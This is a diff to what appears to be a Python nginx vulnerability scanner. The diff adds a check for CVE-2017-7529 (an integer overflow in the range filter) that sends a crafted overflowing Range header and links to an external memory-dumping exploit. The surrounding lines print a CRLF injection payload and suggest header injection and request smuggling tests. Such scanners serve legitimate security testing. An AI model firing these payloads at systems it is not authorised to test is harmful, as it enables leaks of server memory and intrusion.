@@ -225,6 +225,32 @@ for pathline in pathlines:
 if "Detectify" in uri_crlf_test.headers:
     print(Fore.RED+"[-] CRLF injection found via in URL:"+url+"/"+pathline.strip()+" payload: %0d%0aDetectify:%20crlf in URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
 
+print(Fore.CYAN+"\n[?] Testing for common integer overflow vulnerability in nginx's range filter module")
+
+def send_http_request(url, headers={}, timeout=8.0):
+    httpResponse   = requests.get(url, headers=headers, timeout=timeout)
+    httpHeaders    = httpResponse.headers
+
+    print("status: %s: Server: %s", httpResponse.status_code, httpHeaders.get('Server', ''))
+    return httpResponse
+
+
+def exploit(url):
+    print("target: %s", url)
+    httpResponse   = send_http_request(url)
+
+    content_length = httpResponse.headers.get('Content-Length', 0)
+    bytes_length   = int(content_length) + 623
+    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)
+
+    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
+    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
+        print(Fore.RED+"\n[+] Vulnerable to CVE-2017-7529, use this to exploit https://github.com/souravbaghz/Scanginx/blob/master/dumper.py")
+    else:
+        print(Fore.GREEN+"\n[+] Non vulnerable")
+
+exploit(url)
+
 print(Fore.CYAN+"\n[?] If the site uses Redis, please do check out: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/")
 
 print("\n\n"+Fore.CYAN+ "[*] More things that you need to test by hand: CORS misconfiguration (ex: bad regex) with tools like Corsy, Host Header injection, Web cache poisoning & Deception in case NGINX is being for caching as well, HTTP request smuggling both normal request smuggling and https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf. As well as the rest of typical web vulnerabilities")
